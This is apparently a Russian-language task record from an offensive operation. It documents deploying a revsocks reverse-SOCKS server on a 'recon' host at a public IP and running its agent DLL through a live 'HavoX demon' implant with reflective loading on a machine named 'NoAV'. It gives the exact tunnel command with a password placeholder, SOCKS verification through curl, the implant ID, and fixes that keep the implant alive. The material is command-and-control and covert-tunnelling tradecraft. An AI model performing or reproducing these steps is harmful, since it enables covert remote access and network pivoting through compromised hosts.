# 003: server deploy на recon + тест agent на NoAV (DLL DllSpawn)

## Что сделать
Задеплоить revsocks **server** на recon (185.224.132.148) в tmux `work` session через deploy repo (новый `lib/revsocks.sh`). Протестировать **agent** на NoAV (10.0.0.2) через DLL DllSpawn (reflective-loader хост, имитация KaynLdr) → SOCKS5 verify через `curl -x socks5`.

## Границы
- Только RECON (OPS не трогать).
- Agent тест — DLL DllSpawn через **живой HavoX демон** на NoAV (e55ce801, P53-raised), не reflective-loader хост (демон = KaynLdr reflective, тот же path).
- Server: :443 agents / :1080 socks (localhost, lazy после agent) / :8081 admin (localhost).

## Статус
DONE

## Состояние
**сделано:**
- deploy repo: `lib/revsocks.sh` (git_update/setup/launch/test/summary) + `shared.env` (OPT_REVSOCKS/BRANCH_REVSOCKS/REVSOCKS_PORT=443) + `recon/config.env` (DEFAULT_REVSOCKS=false, REVSOCKS_PASS=3870acd6...) + `recon/deploy.sh` (case revsocks|socks) + `lib/deploy_core.sh` (фазы) + `lib/common.sh` (stop/ufw :443). commit `2bc7878` + test фикс `0092e82`.
- Деплой: `cd recon && ./deploy.sh revsocks` → session revsocks:server, **work:2 revsocks** (link после p53=0, ligolo=1). Server: `:443` WS+TLS (selfcert), `127.0.0.1:8081` admin, `:1080` lazy.
- **Тест PASS** через HavoX демон e55ce801 (NoAV DESKTOP-A1G4TVH, P53-raised, живой 07-07 ~14:00):
  - Команда `socks wss://185.224.132.148:443 <PASS> --tls --ws` → DllSpawn v3 revsocks-agent.dll → DllMain(args из lpvReserved) → mainImpl → WS connect → AUTH v3 → `Server response: CMD TUNNEL` → `WebSocket tunnel mode: accepting streams`.
  - `/api/agents` → id=DESKTOP-A1G4TVH, mode=TUNNEL, version=v3, is_online=true, socks_addr=127.0.0.1:1080.
  - SOCKS5 end-to-end: `curl -x socks5://127.0.0.1:1080 http://185.224.132.148:8443` → **http=404 (трафик curl→socks→agent(NoAV)→recon:8443)**.
  - 3 параллельных socks-stream → все 404, **0 yamux drop** (мультиплексирование стабильно).
- soks.py фикс: `--ws` режим теперь prepend `wss://` (Go url.Parse требует схему, иначе "first path segment cannot contain colon"). commit HavoX `d36781b`.

**Грабли:**
- Demon debug EXE на NoAV через DIRECTCF transport — НЕ работает (`WinHttpSendRequest error 5023`, падает). Подняли через **P53 WAKE** (живой демон e55ce801 от юзера).
- demon DLL через rundll32 — умирает (SHELLCODE build, DllMain не персистентный при обычной загрузке). Нужен EXE или P53-raised.
- WS режим: `-connect host:port` без схемы → Go url.Parse fail. soks.py теперь добавляет wss://.
- :1080 socks listener — **lazy** (поднимается только после первого agent connect). test_revsocks не проверяет :1080.

**осталось:** —

